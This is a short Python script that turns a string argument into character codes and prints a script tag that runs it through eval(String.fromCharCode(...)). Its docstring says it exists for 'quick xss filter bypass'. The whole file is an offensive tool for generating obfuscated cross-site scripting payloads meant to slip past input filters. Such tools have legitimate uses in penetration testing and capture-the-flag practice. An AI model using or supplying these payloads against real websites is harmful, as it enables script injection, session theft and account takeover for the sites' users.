#!/usr/bin/python3

import sys

"""script to take a string as its only argument and convert it
into ascii for quick xss filter bypass"""

def stringToAscii(stringToConvert):
    encodeString = stringToConvert.encode()
    convertedString = list(bytes(encodeString))
    catString = ""
    for i in convertedString:
        catString = catString + "" + str(i) + ","
    print("<script>eval(String.fromCharCode(" + catString + "))</script>")

if len(sys.argv) != 2:
    print("Example usage: python3 xss_string_to_ascii.py string_value")
    sys.exit
else:
    stringToAscii(sys.argv[1])
